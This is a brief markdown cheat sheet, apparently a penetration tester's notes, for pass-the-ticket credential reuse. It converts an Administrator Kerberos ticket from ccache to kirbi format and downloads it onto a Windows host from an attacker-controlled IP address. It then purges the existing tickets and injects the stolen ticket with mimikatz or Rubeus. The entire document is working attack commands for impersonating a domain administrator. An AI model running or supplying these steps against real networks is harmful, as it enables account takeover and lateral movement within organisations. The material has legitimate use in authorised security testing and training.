# Cred Usage

## convert ccache to kirbi

```bash
# convert ticket to kirbi for Rubeus or mimikatz
impacket-ticketConverter Administrator.ccache Administrator.kirbi

# then download the ticket on windows
wget -outfile Administrator.kirbi -uri http://192.168.68.10:9595/Administrator.kirbi -usebasicparsing

# ensure all low-priv tickets are removed 
klist purge

# then import the ticket on windows
# use either this
mimikatz "kerberos::ptt Administrator.kirbi" exit
# or this
Rubeus.exe ptt /ticket:Administrator.kirbi

# ensure it's imported
klist
```
